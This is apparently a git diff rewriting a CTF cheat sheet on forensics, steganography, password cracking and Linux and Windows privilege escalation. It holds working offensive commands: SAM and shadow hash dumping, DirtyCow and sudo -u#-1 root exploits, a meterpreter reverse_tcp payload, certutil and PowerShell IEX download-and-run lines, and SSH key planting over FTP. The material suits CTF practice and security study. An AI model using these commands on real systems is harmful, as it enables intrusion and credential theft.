-> $ strings <FILE_NAME> | grep flag{
-```
+- Reveals hidden fields like `Author`, `Comment`, or GPS coordinates.
+- Look for unusual tags like `Software`, `UserComment`, or `DocumentName`.
 
-To extract data hidden inside an image file protected with password.
+---
 
-```
-> $ steghide extract -sf <FILE_NAME>
-```
+#### 🔍 Steganography – Extract Hidden Data
 
-### Binwalk
-
-Binwalk helps to find data inside the image or sometimes if binwalk reports as zip Archive, we can rename the file to <FILE_NAME>.zip to find interesting data.
-```
-> $ binwalk <IMAGE_NAME>
-```
-
-### Extract NTFS Filesystem
-
-```
-If there is ntfs file, extract with 7Zip on Windowds. 
-If there is a file with alternative data strems, we can use the command `dir /R <FILE_NAME>`.
-Then we can this command to extract data inside it `cat <HIDDEN_STREAM> > asdf.<FILE_TYPE>`
+**Use `zsteg` for LSB & color-channel payloads** (PNG only):
+```bash
+zsteg <FILE_NAME>
 ```
 
-To extract ntfs file system on Linux.
-
+**Use `steghide` for password-protected embedded content**:
+```bash
+steghide extract -sf <FILE_NAME>
 ```
-> $ sudo mount -o loop <FILENAME.ntfs> mnt
-```
+- Prompts for password—use `rockyou.txt` for brute-force attempts.
 
-### Recover Files from Deleted File Systems
-
-To Recover Files from Deleted File Systems from Remote Hosts.
-```
-> $ ssh username@remote_address "sudo dcfldd -if=/dev/sdb | gzip -1 ." | dcfldd of=extract.dd.gz
-> $ gunzip -d extract.dd.gz
-> $ binwalk -Me extract.dd
+**Brute-force `steghide` with `steghide_brute`** (optional tool):
+```bash
+python steghide_brute.py -f <FILE_NAME> -w rockyou.txt
 ```
 
-### Packet Capture
-If usb keys are mapped with pcap, we can use this Article to extract usb keys entered: [Link](https://medium.com/@ali.bawazeeer/kaizen-ctf-2018-reverse-engineer-usb-keystrok-from-pcap-file-2412351679f4)
+---
+
+#### 🔡 Extract Embedded Text
+
+```bash
+strings <FILE_NAME> | grep -i flag
 ```
-> $ tskark.exe -r <FILE_NAME.pcapng> -Y "usb.transfer_types==1" -e "frame.time.epoch" -e "usb.capdata" -Tfields
+- Flags often embedded as plaintext or ASCII in CTFs.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Check alpha/transparency channels** for hidden overlays.
+- **Use `binwalk`** to detect embedded ZIPs, images, or files:
+```bash
+binwalk -e <FILE_NAME>
 ```
 
-### JavaScript Deobfuscator
+- **Open image in hex editor** (e.g., `hexeditor`) to inspect tail-end anomalies.
+- **Try OCR** (for CAPTCHA-like flags or graphical encodings):
+```bash
+tesseract <FILE_NAME> stdout
+```
 
-To Deobfuscate JavaScript, use [Jsnice](http://www.jsnice.org/).
+- **Check pixel data manipulation using `stegsolve.jar` or `StegSpy`** for deeper analysis.
+
+
+---
+
+### 🧪 Binwalk – Embedded Data Extraction
+
+`binwalk` is used to analyze binary files (like images or firmware) for **embedded files**, **compressed archives**, or **hidden content**.
+
+---
+
+#### 🔍 Basic Scan
+```bash
+binwalk <IMAGE_NAME>
+```
+- Scans for magic bytes indicating ZIPs, PNGs, PDFs, compressed data, etc.
+
+---
+
+#### 🧠 If ZIP/Archive Is Detected
+
+You can extract it manually:
+```bash
+mv <IMAGE_NAME> <FILE_NAME>.zip
+unzip <FILE_NAME>.zip
+```
+
+---
+
+#### 🔓 Auto Extract All Embedded Files
+```bash
+binwalk -e <IMAGE_NAME>
+```
+- Extracts all identified files into `_<IMAGE_NAME>.extracted/`
+
+---
+
+#### 🔁 Recursive Extraction (Handles nested archives)
+```bash
+binwalk -Me <IMAGE_NAME>
+```
+- Ideal for multi-layered CTF stego challenges.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Use `--dd` to extract specific types manually**:
+```bash
+binwalk --dd='.*' <IMAGE_NAME>
+```
+
+- **Combine with `steghide`, `exiftool`, and `zsteg`** after extraction.
+
+- **Inspect `footer` of embedded files** — flags may be appended after legitimate content.
+
+- **Good for challenges involving firmware, DOCX/XLSX, or disguised file formats**.
+
+
+---
+
+### 💽 Extract NTFS Filesystem
+
+NTFS files may contain **hidden data**, **alternate streams**, or **partitioned content**—commonly leveraged in CTFs.
+
+---
+
+#### 🪟 On Windows (Alternate Data Streams)
+
+1️⃣ **List Hidden Streams:**
+```cmd
+dir /R <FILE_NAME>
+```
+
+2️⃣ **Extract Hidden Stream Content:**
+```bash
+more <FILE_NAME>:<HIDDEN_STREAM>
+```
+or
+```bash
+cat <FILE_NAME>:<HIDDEN_STREAM> > output.<ext>
+```
+
+3️⃣ Use **7-Zip** to extract `.ntfs` containers directly:
+- Right-click → "Extract Here"
+
+---
+
+#### 🐧 On Linux
+
+Mount the NTFS image:
+```bash
+sudo mount -o loop <FILENAME.ntfs> mnt/
+```
+
+- Explore `mnt/` for flags in `$MFT`, `$Recycle.Bin`, or `System Volume Information`.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Search for ADS (Alternate Data Streams) manually on Linux:**
+```bash
+strings <FILE_NAME> | grep -i ":"
+```
+
+- **Use `ntfs-3g` for full read/write NTFS access on Linux.**
+
+- **Use `sleuthkit` or `autopsy`** for forensic-level NTFS inspection.
+
+- **Check for base64 or zip files stored in ADS or hidden folders.**
+
+
+---
+
+### 🧷 Recover Files from Deleted File Systems (Remote Forensics)
+
+Use this method to **image and extract deleted file systems** remotely—commonly required in forensic or IR-based CTFs.
+
+---
+
+#### 📡 Step 1: Create Disk Image Remotely (via SSH)
+```bash
+ssh username@<REMOTE_IP> "sudo dcfldd if=/dev/sdb | gzip -1 -" > extract.dd.gz
+```
+- `dcfldd`: Forensic-friendly `dd` with progress and hashing.
+- `gzip`: Compress data during transfer.
+
+---
+
+#### 📦 Step 2: Decompress Image Locally
+```bash
+gunzip extract.dd.gz
+```
+
+---
+
+#### 🔍 Step 3: Extract and Analyze
+```bash
+binwalk -Me extract.dd
+```
+- Recursively unpacks embedded files, file systems, and archived data.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **If `dcfldd` not available**, use:
+```bash
+ssh user@host "sudo dd if=/dev/sdb bs=4M | gzip -" > disk.dd.gz
+```
+
+- **Use `photorec` or `foremost`** for file carving:
+```bash
+photorec /log /d output/ /cmd recover.cmd
+```
+
+- **Mount partition for manual inspection**:
+```bash
+sudo mount -o loop,ro,offset=<OFFSET> extract.dd mnt/
+```
+- Find offset using `fdisk -l extract.dd`
+
+- **Use `fls` and `icat` from SleuthKit** for targeted recovery:
+```bash
+fls -r extract.dd
+icat extract.dd <inode>
+```
+
+
+---
+
+### 📡 Packet Capture – USB Keystroke Recovery
+
+In CTFs, `.pcap` or `.pcapng` files may contain **USB keyboard traffic**, especially when analyzing hardware-level challenges.
+
+---
+
+#### 🔍 Extract USB Keystrokes from PCAP
+
+Use **tshark** to extract USB data:
+```bash
+tshark -r <FILE_NAME.pcapng> -Y "usb.transfer_type == 1" \
+-e frame.time_epoch -e usb.capdata -T fields
+```
+
+- `usb.transfer_type == 1`: Captures **interrupt transfers** (used for keyboard).
+- `usb.capdata`: Extracts raw keystroke data.
+- Pipe this output into a script to decode keystrokes into readable text.
+
+---
+
+#### 🧠 Full Guide for Decoding USB Input
+
+Follow this detailed article:
+👉 [Reverse USB Keystrokes from PCAP (Kaizen CTF)](https://medium.com/@ali.bawazeeer/kaizen-ctf-2018-reverse-engineer-usb-keystrok-from-pcap-file-2412351679f4)
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Use Wireshark filters** to explore:
+  - `usb.device_address`
+  - `usb.transfer_type`
+  - `usb.capdata`
+  - `frame contains flag`
+
+- **Look for HTTP, FTP, DNS, IRC traffic** in normal `.pcap` files:
+```bash
+tshark -r capture.pcap -Y "http || ftp || dns" -T fields -e ip.dst -e frame.len
+```
+
+- **Use `NetworkMiner` or `tcpflow`** to reconstruct files or extract credentials.
+
+- **Use `strings` on PCAP** for quick wins:
+```bash
+strings file.pcap | grep -i flag
+```
+
+---
+
+### 📜 JavaScript Deobfuscator
+
+Obfuscated JavaScript is often used in web-based CTFs to **hide logic, flags, or backdoor payloads**.
+
+---
+
+#### 🧼 Deobfuscate Quickly
+
+Use this online tool:
+👉 [**JSNice**](http://www.jsnice.org/)
+
+- Automatically formats and renames variables using probabilistic models.
+- Helps understand logic flow and variable roles in obfuscated scripts.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Look for base64, hex, or `eval()` patterns**—common obfuscation tricks.
+- **Replace `eval()` with `console.log()`** to inspect decoded payload.
+- Use browser DevTools:
+  - Paste obfuscated JS into the Console.
+  - Step through with breakpoints.
+- For heavy obfuscation:
+  - Try [**Beautifier.io**](https://beautifier.io/)
+  - Use `prettier` or `js-beautify` locally:
+    ```bash
+    npx prettier --write script.js
+    ```
 
 ## Password Cracking
 
-### JOHN the ripper
+---
 
-If there is `JOHN` in the title or text or hint, its mostly reference to `JOHN the ripper` for bruteforce passwords/hashes.
+### 🔑 JOHN the Ripper – Password Cracking
+
+If the challenge references **"JOHN"**, it's likely hinting at using **John the Ripper** to crack hashes or protected archives.
+
+---
+
+#### 🧨 Basic Usage
+```bash
+john <HASHES_FILE> --wordlist=/usr/share/wordlists/rockyou.txt
 ```
-> $ john <HASHES_FILE> --wordlist=/usr/share/wordlists/rockyou.txt
-```
+- Supports formats like `MD5`, `SHA1`, `bcrypt`, `NTLM`, etc.
+- Automatically detects hash type in many cases.
 
-To crack well known hashes, use [Link](https://crackstation.net/)
+---
 
-### SAM Hashes
-
-To get System User Hashes, we can follow this method.
-```
-> $ /mnt/vhd/Windows/System32/config# cp SAM SYSTEM ~/CTF/
-> $ /mnt/vhd/Windows/System32/config# cd ~/CTF/
-> ~/CTF# ls
-  SAM  SYSTEM  
-> ~/CTF# mkdir Backup_dump
-> ~/CTF# mv SAM SYSTEM Backup_dump/
-> ~/CTF# cd Backup_dump/
-> ~/CTF/Backup_dump# ls
-  SAM  SYSTEM
-> ~/CTF/Backup_dump# impacket-secretsdump -sam SAM -system SYSTEM local
-  Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
-
-  [*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
-  [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-  User:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
-  [*] Cleaning up... 
+#### 🔍 Identify Hash Type (if needed)
+```bash
+john --list=formats | grep <type>
 ```
 
-### Linux User Hashes
-If we able to extract /etc/passwd and /etc/shadow file we can use `unshadow`
+Or use [**hash-identifier**] or [**NameThatHash**].
+
+---
+
+#### 🌐 Online Cracking (Known Hashes)
+
+Use:
+👉 [**CrackStation**](https://crackstation.net/)
+
+- Paste hash to check against massive precomputed tables.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Convert formats using tools:**
+  - `zip2john`, `rar2john`, `pdf2john`, `ssh2john`, etc.
+  ```bash
+  zip2john secret.zip > hash.txt
+  john hash.txt --wordlist=rockyou.txt
+  ```
+
+- **View cracked passwords:**
+```bash
+john --show <HASHES_FILE>
 ```
-> $ unshadow <PASSWD> <SHADOW>
+
+- **Pause/resume cracking:**
+```bash
+john --restore
 ```
 
-### Hashcat
-
-To crack the password, we can use `hashcat` here 500 is for format `$1$` Replace it accordingly.
+- **Crack SSH private key passwords:**
+```bash
+ssh2john id_rsa > ssh.hash
+john ssh.hash --wordlist=rockyou.txt
 ```
-> $ hashcat -m 500 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt --force
+
+
+---
+
+### 🧬 SAM Hashes – Windows User Password Dump
+
+**SAM (Security Account Manager)** stores hashed passwords for Windows accounts. In CTFs, it’s often extracted from mounted `.vhd` or `.img` disk files.
+
+---
+
+#### 🔓 Extract and Dump Hashes
+
+1️⃣ **Copy the SAM and SYSTEM files:**
+```bash
+cp /mnt/vhd/Windows/System32/config/SAM .
+cp /mnt/vhd/Windows/System32/config/SYSTEM .
 ```
 
-### 7z Password Cracking
+2️⃣ **Organize files:**
+```bash
+mkdir Backup_dump
+mv SAM SYSTEM Backup_dump/
+cd Backup_dump/
+```
 
-To extract 7z password, Use tool `7z2john`
+3️⃣ **Dump hashes using `impacket-secretsdump`:**
+```bash
+impacket-secretsdump -sam SAM -system SYSTEM local
+```
 
-### SSH Password Cracking
+✅ You’ll get outputs like:
+```
+Administrator:500:LMHASH:NTHASH:::
+User:1000:LMHASH:NTHASH:::
+```
 
-To crack encrypted ssh key use `ssh2john` tool.
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Crack NT hashes with `john`:**
+```bash
+john hashes.txt --format=NT --wordlist=rockyou.txt
+```
+
+- **If disk image is encrypted (e.g., BitLocker), unlock first using passphrase or key.**
+
+- Use **`mmls` + `fls` + `icat` (SleuthKit)** for forensic-style SAM/SYSTEM extraction from raw disk images.
+
+- Look for clues in **registry hives** and **user profiles** once hash is cracked.
+
+
+---
+
+### 🐧 Linux User Hashes – `/etc/passwd` + `/etc/shadow`
+
+In Linux systems, user credentials are stored across two files:
+
+- `/etc/passwd` – stores usernames and UID info
+- `/etc/shadow` – stores password hashes (restricted access)
+
+---
+
+#### 🔐 Combine with `unshadow`
+```bash
+unshadow passwd shadow > merged_hashes.txt
+```
+- Merges the two files into a format compatible with **John the Ripper**
+
+---
+
+#### 🔓 Crack with John the Ripper
+```bash
+john merged_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **You can extract these from VMs, Docker containers, or mounted file systems.**
+- Look for password hashes starting with:
+  - `$6$` – SHA-512
+  - `$1$` – MD5
+  - `$y$` – yescrypt (more secure)
+- **Use `john --show`** to reveal cracked results:
+```bash
+john --show merged_hashes.txt
+```
+
+- If you only have one hash:
+```bash
+echo 'user:$6$hash....' > onehash.txt
+john onehash.txt --wordlist=rockyou.txt
+```
+
+---
+
+### 🔓 Hashcat – GPU-Accelerated Password Cracking
+
+Hashcat is a powerful tool to crack hashes using GPU acceleration—ideal for large datasets or tougher hashes.
+
+---
+
+#### 🚀 Basic Syntax
+
+```bash
+hashcat -m 500 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+- `-m 500`: Hash type (500 = MD5 crypt, i.e., `$1$`)
+- `-a 0`: Attack mode (0 = dictionary attack)
+- `-o`: Output file for cracked results
+- `--force`: Ignore warnings (used in VMs or non-GPU systems)
+
+---
+
+### 🔢 Common Hash Modes (Use correct `-m`):
+
+| Hash Type        | Example Prefix | Mode |
+|------------------|----------------|------|
+| MD5              | —              | 0    |
+| SHA1             | —              | 100  |
+| SHA256           | —              | 1400 |
+| bcrypt           | `$2y$`, `$2b$` | 3200 |
+| NTLM             | —              | 1000 |
+| SHA512-crypt     | `$6$`          | 1800 |
+| MD5-crypt        | `$1$`          | 500  |
+
+> 🔍 Use [hashid](https://github.com/blackploit/hash-identifier) or `hashid <hash>` to detect the hash type.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- Use `--show` to display cracked results:
+```bash
+hashcat -m 500 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --show
+```
+
+- Crack **hashes from `unshadow`, `zip2john`, or `ssh2john`** by identifying their format and using the right mode.
+
+- Enable optimized GPU use (if supported):
+```bash
+hashcat -O -w 3 ...
+```
+
+- Benchmark all algorithms:
+```bash
+hashcat -b
+```
+
+---
+
+### 📦 7z Password Cracking
+
+To extract and crack a **password-protected `.7z` archive**, use `7z2john.py` from the **John the Ripper** suite.
+
+#### 🔧 Convert to Hash Format:
+```bash
+7z2john.pl protected.7z > 7z.hash
+```
+
+#### 🔓 Crack with John:
+```bash
+john 7z.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+---
+
+### 🔐 SSH Private Key Cracking
+
+If given an encrypted SSH private key (`id_rsa`), you can recover its password using `ssh2john.py`.
+
+#### 🔧 Convert Key to Hash Format:
+```bash
+ssh2john.py id_rsa > ssh.hash
+```
+
+#### 🔓 Crack with John:
+```bash
+john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- If `john` fails, try `hashcat` with proper hash mode (e.g., `-m 14600` for 7z).
+- SSH private key cracks often lead to **user shells or privilege escalation**.
+- Always check metadata or filenames (like `backup.7z`, `id_rsa.bak`)—they often contain valuable credentials.
+
 
 ## Privilige Escalation
 
-### Standard Scripts for Enumeration
-- [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker) - Linux Privilige Enumeration Checker.
-- [Awesome Priv](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
-- [Lin Enum Script](https://github.com/rebootuser/LinEnum)
-- [Unix Priv Check](https://github.com/pentestmonkey/unix-privesc-check)
-- [Pspy](https://github.com/DominicBreuker/pspy) - Information on cronjobs, proceses on target system.
-- [JAWS](https://github.com/411Hall/JAWS) - Windows Enumeration Script.
-- [Cyberchef](https://github.com/gchq/CyberChef) - A web app for encryption, encoding, compression and data analysis.
-- [Pspy](https://github.com/DominicBreuker/pspy) - Gather information on cron, proceses.
-- [Gtfobins](https://gtfobins.github.io/) - If we dont exactly remember how to use a given setuid command to get Privliges.
+---
 
-#### Dirtycow 
+### 🧰 Standard Scripts for Enumeration (CTF Cheatsheet)
 
-On older linux kernals, we can gain root access using dirtycow exploit.
+Use these tools to automate **privilege escalation**, **system enumeration**, and **data decoding**—critical for post-exploitation in CTFs.
 
-To Use DirtyCow : [Link](https://dirtycow.ninja/) - Maybe more specifically : [Dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
+---
 
-#### Sudo 
+#### 🐧 Linux Enumeration
 
-To check what sudo command can the current user run with no-password.
+- 🔍 [**LinEnum**](https://github.com/rebootuser/LinEnum)  
+  - Automates full Linux system enumeration—users, crons, SUIDs, kernels.
 
+- 🧠 [**LinuxPrivChecker**](https://github.com/sleventyeleven/linuxprivchecker)  
+  - Python-based privilege escalation checker (great for local root).
+
+- 🧾 [**Unix-PrivEsc-Check**](https://github.com/pentestmonkey/unix-privesc-check)  
+  - Shell script that checks common privilege escalation vectors.
+
+- 📋 [**PEASS-ng (Linux)**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)  
+  - `linpeas.sh` – Most comprehensive local enumeration script.
+
+---
+
+#### 🪟 Windows Enumeration
+
+- 🔎 [**JAWS**](https://github.com/411Hall/JAWS)  
+  - PowerShell script to scan Windows for escalation paths.
+
+- 📋 [**PEASS-ng (Windows)**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)  
+  - `winPEAS.exe` – Deep enumeration of Windows services, tasks, misconfigs.
+
+---
+
+#### 🕵️ Runtime Process/Job Monitoring
+
+- ⏱️ [**pspy**](https://github.com/DominicBreuker/pspy)  
+  - Observe **cronjobs**, **timed scripts**, or **root-executed processes** without root.
+
+---
+
+#### ⚙️ Exploit Execution Help
+
+- 🔓 [**GTFOBins**](https://gtfobins.github.io/)  
+  - Helps exploit `sudo`, `setuid`, and capability binaries for privilege escalation.
+
+- 📑 [**LOLBAS**](https://lolbas-project.github.io/)  
+  - Windows equivalent to GTFOBins—enumerate and abuse trusted binaries.
+
+---
+
+#### 🧬 Data Analysis & Decoding
+
+- 🧪 [**CyberChef**](https://github.com/gchq/CyberChef)  
+  - "The Cyber Swiss Army Knife" for base64, hex, XOR, encodings, regex, and more.  
+  - Web Version: [CyberChef Online](https://gchq.github.io/CyberChef/)
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- Always upload and run **LinEnum or linpeas** immediately after initial shell.
+- Combine **pspy + GTFOBins** for powerful cron-based privilege escalation.
+- Use **CyberChef** to reverse obfuscation or decode multi-layered strings fast.
+
+
+---
+
+### 🐮 DirtyCow (Linux Privilege Escalation)
+
+Exploit older Linux kernels with [DirtyCow](https://dirtycow.ninja/):  
+👉 PoC Code: [dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
+
+```bash
+gcc -pthread dirty.c -o dirtycow
+./dirtycow
+su firefart  # Password: dirtycow
 ```
-> $ sudo -l
-```
 
-Examples:
+---
 
-```
-> $ sudo -l
-User www-data may run the following commands on bashed:
-(enemy : enemy) NOPASSWD: ALL
-```
-We can try like below
-```
-> $ sudo -u enemy /bin/bash
-id
-uid=1001(enemy) gid=1001(enemy) groups=1001(enemy)
-```
+### 🔐 Sudo Exploitation
 
-```
-> $ sudo -l
-[sudo] password for username: 
-Matching Defaults entries for username on Victim:
-  env_reset, mail_badpass,
-  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
- 
-  User username may run the following commands on Victim:
-    (ALL : ALL) ALL
-> $ cat /root/root.txt
-cat: /root/root.txt: Permission denied  - Does not work
-> $ sudo cat /root/root.txt  - Work
-```
-
-```
-user@host:~$ sudo -l
+Check sudo privileges:
+```bash
 sudo -l
-Matching Defaults entries for user on host:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User user may run the following commands on host:
-    (ALL, !root) /bin/bash
-
-user@host:~$ sudo -u#-1 /bin/bash
-sudo -u#-1 /bin/bash
-Password: Password
-
-Sorry, try again.
-Password: <Enter Password>
-
-root@host:/home/user# id
-id
-uid=0(root) gid=1001(user) groups=1001(user)
-
 ```
 
+Common exploit patterns:
 
-#### Gain More Privilige on windows system
-- In meterpreter shell try `getsystem`
-- In meterpreter shell try `background` and then follow rest of commands.
-- search suggester
+```bash
+sudo -u <target_user> /bin/bash
+sudo cat /root/root.txt
+sudo -u#-1 /bin/bash  # Bypass !root restrictions
 ```
-> use post/multi/recon/local_exploit_suggestor
-show options
+
+---
+
+### 🪟 Windows Privilege Escalation
+
+**In Meterpreter:**
+```bash
+getsystem
+background
+use post/multi/recon/local_exploit_suggestor
 set session 1
 run
 ```
-- If worked fine, else Try follow rest of commands.
-- Use this link: [FuzzySec Win Priv Exec](https://www.fuzzysecurity.com/tutorials/16.html)
-- Use this method: [Sherlock](https://github.com/rasta-mouse/Sherlock)
-- If current process doesnt own Privs, use `migrate <PID>` to get more Priviliges in Meterpretor.
 
+🔍 Other Tools:
+- [Sherlock (Privilege Suggestor)](https://github.com/rasta-mouse/Sherlock)
+- [FuzzySec PrivEsc Guide](https://www.fuzzysecurity.com/tutorials/16.html)
 
-To get Shell on Windows use [Unicorn](https://github.com/trustedsec/unicorn.git)
-```
-> $ /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp <HOST_IP> 3333 
-[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...
-> $ msfconsole -r unicorn.rc 
-[*] Started reverse TCP handler on <HOST_IP>:3333 
-msf5 exploit(multi/handler) >         
+🧬 Migrate Process:
+```bash
+migrate <PID>
 ```
 
-#### MYSQL with Sudo Privilage
-
-To get Shell from MYSQL
+**Shell Delivery:**
+```bash
+/opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp <HOST_IP> 3333
+msfconsole -r unicorn.rc
 ```
+
+---
+
+### 🛢️ MySQL & VIM Privilege Escalation
+
+**MySQL Shell:**
+```sql
 mysql> \! /bin/sh
 ```
 
-#### VIM Editor with Sudo Privilage
-
-To get Shell from VIM.
-
-Method-1:
-```
-> $ sudo /usr/bin/vi /var/www/html/../../../root/root.txt
-```
-Method-2:
-
-```
-> $ sudo /usr/bin/vi /var/www/html/anyrandomFile
-Type Escape and enter :!/bin/bash
+**VIM Shell:**
+```bash
+sudo /usr/bin/vi /file/path
+# Press ESC, then type:
+:!/bin/bash
 ```
 
-#### Cronjob
+---
 
-If some system cron is getting some url present in the file, we can replace url to get flag as below.
-```
-> $ cat input 
-url = "file:///root/root.txt"
-```
+### ⏱️ Cron Job Exploitation
 
-To monitor cronjobs, we can tail the syslogs.
-```
-> $ tail -f /var/log/syslog
-Nov 18 23:55:01 sun CRON[5327]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
-Nov 19 00:00:01 sun CRON[5626]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
-Nov 19 00:00:01 sun CRON[5627]: (sun) CMD (nodejs /home/sun/server.js >/dev/null 2>&1)
-Nov 19 00:05:01 sun CRON[5701]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
+Monitor system jobs:
+```bash
+tail -f /var/log/syslog
 ```
 
-
-#### More or Less Command 
-
-- If any file we found in low priv user and it contains something like this, we can execute it and minimize the size of terminal to enter the visual mode to gain root access.
-
-```
-> $ cat new.sh 
-#!/bin/bash
-/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+Override input:
+```bash
+echo 'url = "file:///root/root.txt"' > input
 ```
 
-```
-> $ sh new.sh 
--- Logs begin at Sun 2019-11-17 19:19:25 EST, end at Mon 2019-11-18 17:13:44 EST. --
-Nov 18 17:02:26 kali sudo[11538]: pam_unix(sudo:auth): authentication failure; logname= uid=33 eu
-Nov 18 17:02:29 kali sudo[11538]: pam_unix(sudo:auth): conversation failed
-Nov 18 17:02:29 kali sudo[11538]: pam_unix(sudo:auth): auth could not identify password for [www-
-Nov 18 17:02:29 kali sudo[11538]: www-data : command not allowed ; TTY=unknown ; PWD=/tmp ; USER=
-Nov 18 17:02:29 kali crontab[11595]: (www-data) LIST (www-data)
+---
+
+### 📜 Exploiting More / Less or Journalctl
+
+If executed via a privileged script:
+```bash
 !/bin/bash
-root # 
 ```
 
-#### Improve Shell
-To get the better Shell after taking control of the system.
-```
-www-data@machine:/var/www/html$ python3 -c "import pty;pty.spawn('/bin/bash')"
-<html$ python3 -c "import pty;pty.spawn('/bin/bash')"                        
-www-data@machine:/var/www/html$ ^Z
-[1]+  Stopped                 nc -nlvp 443
-root@kali:# stty raw -echo
-----------------------Here we need to type `fg` and press Enter `Twice`
-root@kali:# nc -nlvp 443 
-www-data@machine:/var/www/html$ export TERM=xterm
+Example within VIM/Journalctl:
+```bash
+sudo /usr/bin/journalctl -n5 -unostromo.service
+# Then type !/bin/bash
 ```
 
-#### Transfer Files from Host to Target Machine
-- Use `python -m SimpleHTTPServer` in the host folder.
-- Use Apache and put files in `/var/www/html/` folder.
-- If Tomcat is Opened, upload the file/payload using the Admin panel.
-- If wordpress is running, upload the file as plugin.
-- In Windows Victim, use `certutil -urlcache -f http://<HOST_IP>/<FILE_NAME> <OUTPUT_FILE_NAME>`
-- In Windows, Using Powershell: `PS C:\Users\User\Desktop> IEX(New-Object Net.WebClient).downloadString('http://<HOST_IP>:8000/jaws-enum.ps1')`
+---
 
+### 🧬 Improve Reverse Shell
 
-#### FTP
-
-If we were able to access FTP, we can upload SSH Key to login without password.
-```
- > $ ftp <HOST_IP>
-Connected to <HOST_IP>.
-220 ProFTPD 1.3.5a Server (Debian) [::ffff:<HOST_IP>]
-Name (<HOST_IP>:root): notch
-331 Password required for notch
-Password:
-230 User notch logged in
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp> put id_rsa.pub
-ftp> rename id_rsa.pub authorized_keys
+```bash
+python3 -c "import pty; pty.spawn('/bin/bash')"
+# Press CTRL+Z
+stty raw -echo; fg
+export TERM=xterm
 ```
 
-### Reconnoitre
-Security tool for multithreaded information gathering and service enumeration whilst building directory structures to store results, along with writing out recommendations for further testing.
-- [Link](https://github.com/codingo/Reconnoitre)
+---
+
+### 📂 Transfer Files (Host → Victim)
+
+**Linux:**
+```bash
+python3 -m http.server
+wget http://<HOST_IP>:8000/file.sh
 ```
-> $ reconnoitre -t 10.10.10.37 -o `pwd` --services`
+
+**Windows:**
+```bash
+certutil -urlcache -f http://<HOST_IP>/payload.exe payload.exe
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<HOST_IP>:8000/script.ps1')"
 ```
+
+---
+
+### 📁 FTP Access
+
+If login successful:
+```bash
+put id_rsa.pub
+rename id_rsa.pub .ssh/authorized_keys
+```
+
+---
+
+### 🕵️ Reconnoitre – Enumeration Automation
+
+Multi-threaded recon and service enumeration:
+👉 [Reconnoitre Tool](https://github.com/codingo/Reconnoitre)
+
+```bash
+reconnoitre -t <TARGET_IP> -o `pwd` --services
+```
+
+---
